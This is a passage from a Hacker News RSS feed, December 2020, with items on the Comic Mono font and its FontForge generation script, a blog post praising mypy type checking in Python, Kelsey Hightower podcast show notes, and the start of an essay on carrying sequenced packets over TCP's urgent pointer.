href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><strong><u>Hyperloop, the future of travel?</u></strong></a></p></li><li id="viewer-60rl6"><p><span><strong>🏭 </strong></span><a href="https://www.thedetechtor.com/post/carbon-capture-usage-and-storage-the-solution-to-the-climate-crisis" target="_blank" rel="noopener"><strong><u>Carbon Capture, Usage and Storage: The Solution to the Climate Crisis?</u></strong></a></p></li><li id="viewer-5srnl"><p><strong>📱 </strong><a href="https://www.thedetechtor.com/post/smartphones-the-true-cost-of-upgrades" target="_blank" rel="noopener"><strong><u>Smartphones: The True Cost of Upgrades</u></strong></a><strong> ♻️</strong></p></li></ul><h3 id="viewer-cbj21"><span><span>Stay updated:</span></span></h3><ul><li id="viewer-7c1et"><p>📩 Want the latest on the impact of tech? <strong>Subscribe</strong> to our <strong>newsletter</strong>!</p></li><li id="viewer-6bd12"><p>🎙 <a href="http://thedetechtor.com/" target="_blank" rel="noopener"><u>The Detechtor Podcast</u></a> is available on all podcast players!                                                      <strong>Subscribe</strong> on <a href="https://podcasts.apple.com/fr/podcast/the-detechtor-podcast/id1537457578?l=en" target="_blank" rel="noopener"><u>Apple Podcasts</u></a> | <a href="https://open.spotify.com/show/5kc8WA6nZC69bQ1sbOrlNi?si=CwAuAtpfRpe7WmLu1PlO8w" target="_blank" rel="noopener"><u>Spotify</u></a> | <a href="https://podcasts.google.com/search/The%20detechtor%20Podcast" target="_blank" rel="noopener"><u>Google Podcasts</u></a> | <a href="https://www.stitcher.com/show/the-detechtor-podcast" target="_blank" rel="noopener"><u>Stitcher</u></a> | <a href="https://tunein.com/podcasts/Technology-Podcasts/The-Detechtor-Podcast-p1377296/?topicid=158813573" target="_blank" rel="noopener"><u>Tunein</u></a></p></li><li id="viewer-4tmjb"><p>📲 Let's connect! <strong>Follow</strong> <strong>us</strong> on <a href="https://twitter.com/the_detechtor" target="_blank" rel="noopener"><u>Twitter</u></a> | <a href="https://www.instagram.com/thedetechtor/" target="_blank" rel="noopener"><u>Instagram</u></a> | <a href="https://www.facebook.com/thedetechtor" target="_blank" rel="noopener"><u>Facebook</u></a> | <a href="https://www.youtube.com/channel/UCAW--4_mML4A86W3670ix3w" target="_blank" rel="noopener"><u>Youtube</u></a></p></li></ul></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.thedetechtor.com/post/solar-glass-energy-in-big-cities</link>
            <guid isPermaLink="false">hacker-news-small-sites-25520589</guid>
            <pubDate>Wed, 23 Dec 2020 18:37:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Comic Mono]]>
            </title>
            <description>
<![CDATA[
Score 523 | Comments 188 (<a href="https://news.ycombinator.com/item?id=25520510">thread link</a>) | @thesephist
<br/>
December 23, 2020 | https://dtinth.github.io/comic-mono-font/ | <a href="https://web.archive.org/web/*/https://dtinth.github.io/comic-mono-font/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
<p>A legible monospace font… the very typeface you’ve been trained to recognize since childhood. This font is a fork of <a href="https://github.com/shannpersand">Shannon Miwa</a>’s <a href="https://github.com/shannpersand/comic-shanns">Comic Shanns</a> (version 1).</p>

<p>
  <a href="https://dtinth.github.io/comic-mono-font/">
    <img src="https://repository-images.githubusercontent.com/164606802/cd83d680-894c-11e9-83f7-c353c70df1cb" alt="Screenshot">
  </a>
</p>

<h2 id="download">Download</h2>
<ul>
  <li><a href="https://dtinth.github.io/comic-mono-font/ComicMono.ttf">ComicMono.ttf</a></li>
  <li><a href="https://dtinth.github.io/comic-mono-font/ComicMono-Bold.ttf">ComicMono-Bold.ttf</a></li>
</ul>

<h2 id="differences-from-comic-shanns">Differences from Comic Shanns</h2>
<ol>
  <li>All glyphs have been adjusted to have exactly the same width (using code based on <a href="https://github.com/cpitclaudel/monospacifier">monospacifier</a>).</li>
  <li>The glyph metrics have been adjusted to make it display better alongside system font, based on <a href="https://fonts.google.com/specimen/Cousine">Cousine</a>’s metrics.</li>
  <li>The name is changed to <code>Comic Mono</code>.</li>
  <li>A bold version of the font is generated using <a href="https://fontforge.github.io/Styles.html#Embolden">FontForge’s Embolden</a> operation.</li>
</ol>

<p>I have no font creation skills; I’m just a software developer. This font family is created by patching the original font, <a href="https://github.com/shannpersand/comic-shanns">Comic Shanns (v1)</a>, using a Python script, <a href="https://dtinth.github.io/comic-mono-font/generate.py"><code>generate.py</code></a>.</p>

<h2 id="what-does-it-look-like">What does it look like?</h2>
<p>
  <a href="https://dtinth.github.io/comic-mono-font/#what-does-it-look-like">
    Check it out!
  </a>
</p>

<div><div><pre><code><span>#!/usr/bin/env python2
# -*- coding: utf-8 -*-
</span>
<span>"""
Generates the Comic Mono font files based on Comic Shanns font.

Required files:
- vendor/comic-shanns.otf
- vendor/Cousine-Regular.ttf

Based on:
- monospacifier: https://github.com/cpitclaudel/monospacifier/blob/master/monospacifier.py
- YosemiteAndElCapitanSystemFontPatcher: https://github.com/dtinth/YosemiteAndElCapitanSystemFontPatcher/blob/master/bin/patch
"""</span>

<span>import</span> <span>os</span>
<span>import</span> <span>re</span>
<span>import</span> <span>sys</span>

<span>reload</span><span>(</span><span>sys</span><span>)</span>
<span>sys</span><span>.</span><span>setdefaultencoding</span><span>(</span><span>'UTF8'</span><span>)</span>

<span>import</span> <span>fontforge</span>
<span>import</span> <span>psMat</span>
<span>import</span> <span>unicodedata</span>

<span>def</span> <span>height</span><span>(</span><span>font</span><span>):</span>
    <span>return</span> <span>float</span><span>(</span><span>font</span><span>.</span><span>capHeight</span><span>)</span>

<span>def</span> <span>adjust_height</span><span>(</span><span>source</span><span>,</span> <span>template</span><span>,</span> <span>scale</span><span>):</span>
    <span>source</span><span>.</span><span>selection</span><span>.</span><span>all</span><span>()</span>
    <span>source</span><span>.</span><span>transform</span><span>(</span><span>psMat</span><span>.</span><span>scale</span><span>(</span><span>height</span><span>(</span><span>template</span><span>)</span> <span>/</span> <span>height</span><span>(</span><span>source</span><span>)))</span>
    <span>for</span> <span>attr</span> <span>in</span> <span>[</span><span>'ascent'</span><span>,</span> <span>'descent'</span><span>,</span>
                <span>'hhea_ascent'</span><span>,</span> <span>'hhea_ascent_add'</span><span>,</span>
                <span>'hhea_linegap'</span><span>,</span>
                <span>'hhea_descent'</span><span>,</span> <span>'hhea_descent_add'</span><span>,</span>
                <span>'os2_winascent'</span><span>,</span> <span>'os2_winascent_add'</span><span>,</span>
                <span>'os2_windescent'</span><span>,</span> <span>'os2_windescent_add'</span><span>,</span>
                <span>'os2_typoascent'</span><span>,</span> <span>'os2_typoascent_add'</span><span>,</span>
                <span>'os2_typodescent'</span><span>,</span> <span>'os2_typodescent_add'</span><span>,</span>
                <span>]:</span>
        <span>setattr</span><span>(</span><span>source</span><span>,</span> <span>attr</span><span>,</span> <span>getattr</span><span>(</span><span>template</span><span>,</span> <span>attr</span><span>))</span>
    <span>source</span><span>.</span><span>transform</span><span>(</span><span>psMat</span><span>.</span><span>scale</span><span>(</span><span>scale</span><span>))</span>

<span>font</span> <span>=</span> <span>fontforge</span><span>.</span><span>open</span><span>(</span><span>'vendor/comic-shanns.otf'</span><span>)</span>
<span>ref</span> <span>=</span> <span>fontforge</span><span>.</span><span>open</span><span>(</span><span>'vendor/Cousine-Regular.ttf'</span><span>)</span>
<span>for</span> <span>g</span> <span>in</span> <span>font</span><span>.</span><span>glyphs</span><span>():</span>
    <span>uni</span> <span>=</span> <span>g</span><span>.</span><span>unicode</span>
    <span>category</span> <span>=</span> <span>unicodedata</span><span>.</span><span>category</span><span>(</span><span>unichr</span><span>(</span><span>uni</span><span>))</span> <span>if</span> <span>0</span> <span>&lt;=</span> <span>uni</span> <span>&lt;=</span> <span>sys</span><span>.</span><span>maxunicode</span> <span>else</span> <span>None</span>
    <span>if</span> <span>g</span><span>.</span><span>width</span> <span>&gt;</span> <span>0</span> <span>and</span> <span>category</span> <span>not</span> <span>in</span> <span>[</span><span>'Mn'</span><span>,</span> <span>'Mc'</span><span>,</span> <span>'Me'</span><span>]:</span>
        <span>target_width</span> <span>=</span> <span>510</span>
        <span>if</span> <span>g</span><span>.</span><span>width</span> <span>!=</span> <span>target_width</span><span>:</span>
            <span>delta</span> <span>=</span> <span>target_width</span> <span>-</span> <span>g</span><span>.</span><span>width</span>
            <span>g</span><span>.</span><span>left_side_bearing</span> <span>+=</span> <span>delta</span> <span>/</span> <span>2</span>
            <span>g</span><span>.</span><span>right_side_bearing</span> <span>+=</span> <span>delta</span> <span>-</span> <span>g</span><span>.</span><span>left_side_bearing</span>
            <span>g</span><span>.</span><span>width</span> <span>=</span> <span>target_width</span>

<span>font</span><span>.</span><span>familyname</span> <span>=</span> <span>'Comic Mono'</span>
<span>font</span><span>.</span><span>version</span> <span>=</span> <span>'0.1.1'</span>
<span>font</span><span>.</span><span>comment</span> <span>=</span> <span>'https://github.com/dtinth/comic-mono-font'</span>
<span>font</span><span>.</span><span>copyright</span> <span>=</span> <span>'https://github.com/dtinth/comic-mono-font/blob/master/LICENSE'</span>

<span>adjust_height</span><span>(</span><span>font</span><span>,</span> <span>ref</span><span>,</span> <span>0.875</span><span>)</span>
<span>font</span><span>.</span><span>sfnt_names</span> <span>=</span> <span>[]</span> <span># Get rid of 'Prefered Name' etc.
</span><span>font</span><span>.</span><span>fontname</span> <span>=</span> <span>'ComicMono'</span>
<span>font</span><span>.</span><span>fullname</span> <span>=</span> <span>'Comic Mono'</span>
<span>font</span><span>.</span><span>generate</span><span>(</span><span>'ComicMono.ttf'</span><span>)</span>

<span>font</span><span>.</span><span>selection</span><span>.</span><span>all</span><span>()</span>
<span>font</span><span>.</span><span>fontname</span> <span>=</span> <span>'ComicMono-Bold'</span>
<span>font</span><span>.</span><span>fullname</span> <span>=</span> <span>'Comic Mono Bold'</span>
<span>font</span><span>.</span><span>weight</span> <span>=</span> <span>'Bold'</span>
<span>font</span><span>.</span><span>changeWeight</span><span>(</span><span>32</span><span>,</span> <span>"LCG"</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>"squish"</span><span>)</span>
<span>font</span><span>.</span><span>generate</span><span>(</span><span>'ComicMono-Bold.ttf'</span><span>)</span>
</code></pre></div></div>

<h2 id="cdn">CDN</h2>
<p>You can use this font in your web pages by including the stylesheet. CDN is provided by <a href="https://www.jsdelivr.com/package/npm/comic-mono">jsDelivr</a>.</p>
<div><div><pre><code><span>&lt;link</span> <span>rel=</span><span>"stylesheet"</span> <span>href=</span><span>"https://cdn.jsdelivr.net/npm/comic-mono@0.0.1/index.css"</span><span>&gt;</span>
</code></pre></div></div>

<h2 id="npm-package">npm Package</h2>
<p>The contents of this package is also <a href="https://www.npmjs.com/package/comic-mono">published to npm</a>, although the font files are not optimized. See fontsource package (below) for a better option.</p>

<h2 id="packages-published-by-third-parties">Packages published by third parties</h2>
<ul>
  <li>Fontsource: <a href="https://www.npmjs.com/package/@fontsource/comic-mono">@fontsource/comic-mono</a> (<a href="https://github.com/fontsource/fontsource/pull/117">thanks @DecliningLotus</a>)</li>
  <li>Arch Linux AUR: <a href="https://aur.archlinux.org/packages/ttf-comic-mono-git/">ttf-comic-mono-git</a> (maintained by DBourgeoisat)</li>
</ul>

<h2 id="license">License</h2>
<p>It is licensed under the <a href="https://dtinth.github.io/comic-mono-font/LICENSE">MIT License</a>.</p>


      
      
      
    </div></div>]]>
            </description>
            <link>https://dtinth.github.io/comic-mono-font/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25520510</guid>
            <pubDate>Wed, 23 Dec 2020 18:29:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Joy That's Typed Python]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25520411">thread link</a>) | @hannofcart
<br/>
December 23, 2020 | https://balajeerc.info/The-Joy-of-Typed-Python | <a href="https://web.archive.org/web/*/https://balajeerc.info/The-Joy-of-Typed-Python">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="text">
        <p>If I am to start working on a new project today, I would hesitate to attempt it in a language that does not have compile-time type checking. However, I do have to deal with Python at work (though we are slowly phasing it out). Also, I have been working off and on, in my spare time, on a Python project that has over the past 3+ years gotten fairly large as personal projects go. It started out as a one-off quick script. It eventually evolved into something larger that actually does something useful for me so I ended up adding to it and maintaining it.</p>

<p>Somewhere over a year and a half back, after being frustrated with my inability to refactor this code like I can with other type safe languages, I started exploring the possibility of adding type hints to the codebase. Now, after having spent the requisite time to understand the implications of type hinting, and whether it’s useful, and to be able to show this as a consolidation of my thoughts on the matter to friends and colleagues, I decided to write this post on what an <strong>absolute joy</strong> it has become to refactor and work with Python once you have type checking enforced.</p>

<p>Just to set expectations right: the following is more of gushing praise for <code>mypy</code> rather than <a href="https://mypy.readthedocs.io/en/stable/getting_started.html">a tutorial on how to use it</a>. If you are already using <code>mypy</code> on a regular basis, you are likely going to learn little from what follows. This is written with the hope of giving other friends of mine who are Python programmers an overview of starting with type annotations, if they aren’t already using them by detailing the nice things it provides. It also details some of the effort you will likely need to pay up front to make type-checking effective in your codebase, and the rough edges (yes, there are some) in the type annotation system that will likely cause you some annoyance.</p>

<p>Another expectation I’d like to calibrate is for people coming to this from a language with a sophisticated type system such as Rust or Haskell, or even more traditional type systems like Java and C++. These are things you take for granted and you will likely scoff at some of the things written here. However, I urge you to look at the benefits the following provide to the current state of Python programming that has no static type checking.</p>

<h2 id="overview-of-type-annotations-in-python">Overview of Type Annotations in Python</h2>

<p>First things first: Python, back from versions 3.5+, has already had support for type annotations. It is detailed in <a href="https://www.python.org/dev/peps/pep-0484">PEP 484</a>. This means that you can write functions that look like this:</p>

<div><div><pre><code><span>def</span> <span>sum</span><span>(</span><span>a</span><span>:</span> <span>int</span><span>,</span> <span>b</span><span>:</span> <span>int</span><span>)</span> <span>-&gt;</span> <span>int</span><span>:</span>
    <span>return</span> <span>a</span> <span>+</span> <span>b</span>
</code></pre></div></div>

<p>However, the Python interpreter in no way enforces it, and will not enforce it in future. Python is expected to remain a dynamically typed language for the foreseeable future. The above function will run happily if called with <code>sum("hello", "world")</code> and return a concatenation of the two strings contrary to the intended use of the function. The Python interpreter simply ignores the type annotations.</p>

<p>However, you can use third party type checkers which will do static analysis of your code based on these type annotations and point out any type errors lurking in your code. The introduction of type annotations as part of the language syntax itself provides for much better aesthetics as compared to having to retrofit the type hints via code comments (a la Flow for pre ES6 JavaScript) and better ergonomics as compared to needing a transpiler to convert a new augmented language to valid vanilla code (like Typescript does).</p>

<p>One such type-checker is <code>mypy</code> - the earliest implementation of its kind that some of the Python core team are involved in, including the venerable Guido Van Rossum. However, note that<code>mypy</code> is a distinct from the Python interpreter and <a href="http://www.mypy-lang.org/">maintained as a separate project</a>. You will need to download and install it separately.</p>

<p>Running <code>mypy</code> on a file containing the aforementioned invocation of the <code>sum</code> function above with string arguments results in the following error from the type checker:</p>

<div><div><pre><code>Argument 2 to "sum" has incompatible type "str"; expected "int"
</code></pre></div></div>

<p><code>mypy</code> is not the only type checker out there. There are other type checkers such as <code>Pyright</code> from Microsoft and <code>pyre</code> from Facebook. However, my experience with them is limited and the following notes are based on my experience with <code>mypy</code> exclusively.</p>

<h2 id="things-i-love">Things I love</h2>

<p>The trivial example that I stated above does not do justice to the sophistication that <code>mypy</code> brings. While you will need to grapple with installing, configuring it and running it on your code, in this section I’ll be detailing some of my favourite things it facilitates once you pay that price.</p>

<h3 id="optional-values-strictly-enforced">Optional Values, Strictly Enforced</h3>

<p>If there is a single thing that you can take away from this post, it ought to be the unreasonable effectiveness of strictly checked optional values. Just this one feature has had such a dramatic improvement on my code correctness that I cannot emphasise this enough.</p>

<p>Errors in software arising from not checking for nulls is <a href="https://www.infoq.com/presentations/Null-References-The-Billion-Dollar-Mistake-Tony-Hoare/">“a billion dollar problem”</a> and <code>mypy</code> is an invaluable guard against them. The primary type annotation (<em>type modifier</em> in <code>mypy</code> terms) that helps with this is the <a href="https://github.com/dry-python/returns#result-container"><code>Optional</code></a> annotation. In my opinion, explicitly handling and indicating where a value can be null fosters greater code correctness as  to approaches in languages like Java where any value can potentially be null.</p>

<p>Consider a canonical ‘customer record’ management scenario (yes, I’m unimaginative like that). Presumably, a simple customer type could be defined like so:</p>

<div><div><pre><code><span>class</span> <span>Customer</span><span>:</span>
    <span>name</span><span>:</span> <span>str</span>
    <span>address</span><span>:</span> <span>Optional</span><span>[</span><span>str</span><span>]</span>
</code></pre></div></div>

<p>In this type, we encode the fact that we may sometime not have the customer’s address registered in our database, into the type itself. In vanilla Python without annotations, we would have just defined it as a string with the possibility that it may be <code>None</code> that we need to ‘remember’ any time we used it.</p>

<p>To demonstrate the utility of <code>Optional</code> type used in conjunction with <code>mypy</code>, let’s look at a (slightly contrived) example of an implementation checking how far a customer resides from our store. To simplify the example, we abstract away the details of looking up a <a href="https://developers.google.com/maps/documentation/javascript/examples/geocoding-simple">Geocoding service</a> and code to calculate distance between two geo-coordinates.</p>

<p>A first iteration of this code might look like so:</p>

<div><div><pre><code><span># A type alias for a (lat, long) tuple
</span><span>Coords</span> <span>=</span> <span>Tuple</span><span>[</span><span>float</span><span>,</span> <span>float</span><span>]</span>

<span>def</span> <span>geo_lookup</span><span>(</span><span>input_address</span><span>:</span> <span>str</span><span>)</span> <span>-&gt;</span> <span>Optional</span><span>[</span><span>Coords</span><span>]:</span>
    <span># ... snip ...
</span>    <span># Geocoding API lookup
</span>    <span># Hardcoding return for now
</span>    <span>return</span> <span>(</span><span>12.972442</span><span>,</span> <span>77.580643</span><span>)</span>

<span>def</span> <span>calculate_distance_in_miles</span><span>(</span><span>coord1</span><span>:</span> <span>Coords</span><span>,</span> <span>coord2</span><span>:</span> <span>Coords</span><span>)</span> <span>-&gt;</span> <span>float</span><span>:</span>
    <span># ... snip ...
</span>    <span># Distance computation
</span>    <span># Hardcoding return for now
</span>    <span>return</span> <span>3.5</span>

<span># WARNING: Buggy code below
</span><span>def</span> <span>get_delivery_distance</span><span>(</span><span>customer</span><span>:</span> <span>Customer</span><span>,</span> <span>store_coords</span><span>:</span> <span>Coords</span><span>)</span> <span>-&gt;</span> <span>float</span><span>:</span>
    <span>geo_coords</span><span>:</span> <span>Coords</span> <span>=</span> <span>geo_lookup</span><span>(</span><span>customer</span><span>.</span><span>address</span><span>)</span> <span># Errors here
</span>    <span>return</span> <span>calculate_distance_in_miles</span><span>(</span><span>geo_coords</span><span>,</span> <span>store_coords</span><span>)</span>
</code></pre></div></div>

<p>Running this through <code>mypy</code> generates the following errors:</p>

<div><div><pre><code>geo.py:18: error: Incompatible types in assignment (expression has type "Optional[Tuple[float, float]]", variable has type "Tuple[float, float]")
geo.py:18: error: Argument 1 to "geo_lookup" has incompatible type "Optional[str]"; expected "str"
</code></pre></div></div>

<p>As you can imagine, this is quite a lifesaver in more real world conditions. <code>mypy</code> just caught the error of using <code>customer.address</code> without checking if it is <code>None</code>. It also caught the bug where we are trying to assign the <code>geo_coords</code> value to the return from <code>geo_lookup</code> without accounting for the fact that it too can return <code>None</code>.</p>

<p>The corrected version of the <code>get_delivery_distance</code> would look like so:</p>

<div><div><pre><code><span>def</span> <span>get_delivery_distance</span><span>(</span><span>customer</span><span>:</span> <span>Customer</span><span>,</span> <span>store_coords</span><span>:</span> <span>Coords</span><span>)</span> <span>-&gt;</span> <span>Optional</span><span>[</span><span>float</span><span>]:</span>
    <span>if</span> <span>customer</span><span>.</span><span>address</span> <span>is</span> <span>None</span><span>:</span>
        <span>return</span> <span>None</span>
    <span>geo_coords</span><span>:</span> <span>Optional</span><span>[</span><span>Coords</span><span>]</span> <span>=</span> <span>geo_lookup</span><span>(</span><span>customer</span><span>.</span><span>address</span><span>)</span>
    <span>if</span> <span>geo_coords</span><span>:</span>
        <span>return</span> <span>calculate_distance_in_miles</span><span>(</span><span>geo_coords</span><span>,</span> <span>store_coords</span><span>)</span>
    <span>return</span> <span>None</span>
</code></pre></div></div>

<p>In the above code, we take change the return type of <code>get_delivery_address</code> to account for the possibility that it may be <code>None</code>. Furthermore, we expressly handle both the possibility of <code>customer.address</code> being <code>None</code> as well as the return from the geocoding lookup service being <code>None</code>. As you see, <code>mypy</code> cleverly infers that you have indeed handled the <code>None</code> cases appropriately and hence does not throw errors in the new code.</p>

<p>As you can observe, this enforcement of checking for optional values cascades through your codebase and <code>mypy</code> is always looking over your shoulders to warn you against potential places where you have not handled them. Furthermore, it’s very cool that <code>mypy</code> manages to do a significant amount of type inference based on the conditional blocks, looking for checks for <code>None</code>. Contrast this with languages like C++ where, in code written with the equivalent  <code>std::optional</code> calls to <code>std::optional::value()</code> method will happily compile, and fail at runtime throwing a <code>bad_optional_access</code> exception if in fact it holds only a null value.</p>

<p>If you are a Rust or Haskell programmer, you are at this point cringing at all the conditional checks, and missing your <code>Either</code> s and <code>Maybe</code>s. There are some <a href="https://github.com/dry-python/returns#result-container">third party libraries</a> that (sorta) provide these for you though I have not used these in my code.</p>

<h3 id="generics">Generics</h3>

<p>The irony of lauding the support for generics in the type annotations of a language that is intrinsically dynamically typed is not lost on me. Nevertheless, as soon as you enter the world that is typed Python even if it’s make believe, you start needing generics. Thankfully, the support for it is quite nice.</p>

<p>Here is a snippet plagiarised entirely from the <code>mypy</code> <a href="https://mypy.readthedocs.io/en/stable/generics.html#defining-generic-classes">documentation</a>:</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>TypeVar</span><span>,</span> <span>Generic</span>

<span>T</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'T'</span><span>)</span>

<span>class</span> <span>Stack</span><span>(</span><span>Generic</span><span>[</span><span>T</span><span>]):</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>)</span> <span>-&gt;</span> <span>None</span><span>:</span>
        <span># Create an empty list with items of type T
</span>        <span>self</span><span>.</span><span>items</span><span>:</span> <span>List</span><span>[</span><span>T</span><span>]</span> <span>=</span> <span>[]</span>

    <span>def</span> <span>push</span><span>(</span><span>self</span><span>,</span> <span>item</span><span>:</span> <span>T</span><span>)</span> <span>-&gt;</span> <span>None</span><span>:</span>
        <span>self</span><span>.</span><span>items</span><span>.</span><span>append</span><span>(</span><span>item</span><span>)</span>

    <span>def</span> <span>pop</span><span>(</span><span>self</span><span>)</span> <span>-&gt;</span> <span>T</span><span>:</span>
        <span>return</span> <span>self</span><span>.</span><span>items</span><span>.</span><span>pop</span><span>()</span>

    <span>def</span> <span>empty</span><span>(</span><span>self</span><span>)</span> <span>-&gt;</span> <span>bool</span><span>:</span>
        <span>return</span> <span>not</span> <span>self</span><span>.</span><span>items</span>
</code></pre></div></div>

<p>The generic <code>T</code> …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://balajeerc.info/The-Joy-of-Typed-Python">https://balajeerc.info/The-Joy-of-Typed-Python</a></em></p>]]>
            </description>
            <link>https://balajeerc.info/The-Joy-of-Typed-Python</link>
            <guid isPermaLink="false">hacker-news-small-sites-25520411</guid>
            <pubDate>Wed, 23 Dec 2020 18:21:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kelsey Hightower – On ways Kubernetes can break and being an effective leader]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25520337">thread link</a>) | @ronaknnathani
<br/>
December 23, 2020 | https://softwaremisadventures.com/podcast/2020/12/kelsey-hightower/ | <a href="https://web.archive.org/web/*/https://softwaremisadventures.com/podcast/2020/12/kelsey-hightower/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="bio">Bio</h2><p><a href="https://twitter.com/kelseyhightower" target="_blank" rel="noopener"><strong>Kelsey Hightower</strong></a> is a Principal Developer Advocate at Google working on Google Cloud Platform. He has worn every hat possible throughout his career in tech and enjoys leadership roles focused on making things happen and shipping software. He is a strong open source advocate with a focus on building great software as well as great communities around them. He is also an accomplished author and keynote speaker with a knack for demystifying complex topics, doing live demos and enabling others to succeed. When he is not writing code, you can catch him giving technical workshops covering everything from programming to system administration.</p><h2 id="show-notes">Show Notes</h2><p>In this insightful conversation with Kelsey, we cover wide ranging topics from his role at Google to the art of storytelling. We get into some very interesting details of how Kubernetes can break in production and practices that work for Kelsey in being an effective leader.</p><p>We had a great time talking to Kelsey and hope you enjoy this conversation as much as we did!</p><h2 id="transcript">Transcript</h2><p>You can read the episode
<a href="https://softwaremisadventures.com/transcript/kelsey/">transcript here</a>.</p><h2 id="links">Links</h2><ul><li><a href="https://twitter.com/kelseyhightower" target="_blank" rel="noopener">Kelsey on Twitter</a></li><li><a href="https://github.com/kelseyhightower" target="_blank" rel="noopener">Kelsey on GitHub</a></li></ul><div><h3>Music Credits</h3><p>Vlad Gluschenko — Forest<br>License: Creative Commons Attribution 3.0<br>Unported: https://creativecommons.org/licenses/by/3.0/deed.en</p></div></div></div>]]>
            </description>
            <link>https://softwaremisadventures.com/podcast/2020/12/kelsey-hightower/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25520337</guid>
            <pubDate>Wed, 23 Dec 2020 18:14:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sequenced Packets over Ordinary TCP]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25520332">thread link</a>) | @harporoeder
<br/>
December 23, 2020 | http://urchin.earth.li/~twic/Sequenced_Packets_Over_Ordinary_TCP.html | <a href="https://web.archive.org/web/*/http://urchin.earth.li/~twic/Sequenced_Packets_Over_Ordinary_TCP.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<p>This is a rough idea for an admittedly not hugely useful technical 
hack related to low-level network protocol gubbins. If you don't want to 
know about this, look away now.</p>

<p>I will assume you know what <a href="http://www.rfc-editor.org/rfc/rfc793.txt">TCP</a> is (oh - i'll
warn you now that i say 'packet' instead of 'segment' throughout this
document; i'm like that). I will assume you know what the <a href="http://www.opengroup.org/onlinepubs/007908799/xns/syssocket.h.html">POSIX
socket API</a> almost universally used to access it is. What you may or
may not know about are the two things i'm going to talk about today: the
sequenced packet (aka SOCK_SEQPACKET) socket type from the socket API
and the urgent pointer from the TCP specification.</p>

<p>The socket API supports sockets of several types; 'type' does not
refer to the protocol behind the socket, but rather to the semantics
associated with the socket. The best-known socket types are stream
(SOCK_STREAM) and datagram (SOCK_DGRAM); the former supplies a pair of
full-duplex, reliable, ordered, structureless byte streams connected to
a single remote socket, while the latter supplies an aperture through
which unreliable, unordered, smallish bundles of bytes can be sent to
multiple remote sockets. There are, however, other socket types; the 
most interesting is the sequenced-packet socket (SOCK_SEQPACKET). The <a href="http://www.opengroup.org/onlinepubs/009695399/functions/xsh_chap02_10.html">actual 
text</a> of the socket API specification says of sequenced packet 
sockets:</p>

<blockquote>The SOCK_SEQPACKET socket type is similar to the SOCK_STREAM
type, and is also connection-oriented. The only difference between these
types is that record boundaries are maintained using the SOCK_SEQPACKET
type. A record can be sent using one or more output operations and
received using one or more input operations, but a single operation
never transfers parts of more than one record. Record boundaries are
visible to the receiver via the MSG_EOR flag in the received message
flags returned by the recvmsg() function. It is protocol-specific
whether a maximum record size is imposed.</blockquote>

<p>So basically, it's either a sequence of packets which are delivered
reliably and in order, or a reliable, ordered stream with record
boundaries in it, depending on how you look at it. Either way, it's
clearly halfway between stream (ie TCP) and datagram (ie UDP) sockets.
The stuff about MSG_EOR is how you mark the ends of messages; messages
are read and written like stream data, but with a couple of nuances: to
mark the end of a message when sending, set the MSG_EOR flag in the last
send(), and to detect the end of a message when receiving, use recvmsg()
and look for the MSG_EOR flag in the msghdr.msg_flags field.</p>

<p>(Incidentally, that line saying "a record can be sent using one or
more output operations and received using one or more input operations"
is a bit weird; the specs for recv() and recvmsg() say "for
message-based sockets such as SOCK_DGRAM and SOCK_SEQPACKET, the entire
message must be read in a single operation.". There's a <a href="http://www.opengroup.org/austin/mailarchives/austin-review-l/msg00839.html">post
on an Open Group mailing list</a> on the semantics of the MSG_WAITALL
flag in the context of sequenced packet sockets which indicates that
messages on a sequenced packet socket can indeed be delivered through
multiple recv() calls, which does make more sense; you can then use
MSG_WAITALL to force delivery in a single read, although it doesn't work
if the message is bigger than your buffer)</p>

<p>Moreover, sequenced packet sockets are probably the most
programmer-friendly kind: they have strong reliability and ordering
guarantees (like TCP but unlike UDP), and they provide record
demarcation at the protocol level (like UDP but unlike TCP); they should
therefore be a key tool for network programmers. However, as far as i
can tell, there is no internet transport-layer protocol in common use
which has sequenced packet semantics; SOCK_SEQPACKET is therefore not a
generally available socket type! Where it does turn up is when you're
running connections straight over ATM or IR or other suitable link
layers, and nobody cares about that.</p>

<p>But all is not lost! I have come up with a way to supply sequenced
packet semantics using entirely normal TCP, by exploiting a little-used
but historically ancient feature of that protocol which, i think, was
designed expressely for that purpose: the urgent pointer.</p>

<p>The TCP spec is pretty brief, so have a read through and see what it
says about the the urgent pointer. Basically, it's a facility by which
one end of a TCP connection can indicate to the other that there's
urgent data somewhere in the stream. From the client (ie
application-layer protocol) point of view, it looks like there's a
button next to the output stream of each socket, with a red light next
to the input stream of the other, both labelled 'URGENT!!!'; one end
writes some data that it thinks is urgent, then hits the button: the
light at the other end then goes on immediately, and goes off once the
client has read all the data that the sender had written before hitting
the button. The TCP modules handle this by dint of two components of
their packets: the 'urgent pointer field significant' (aka URG) control
bit, and the urgent pointer (UP). The URG bit is set in all packets sent
after the button is pressed, up to and including the one containing the
last byte of urgent data; the presence of a set URG bit in a packet
therefore indicates to the receiving TCP module that it should switch on
the urgency light. The UP points to the last byte of the urgent data
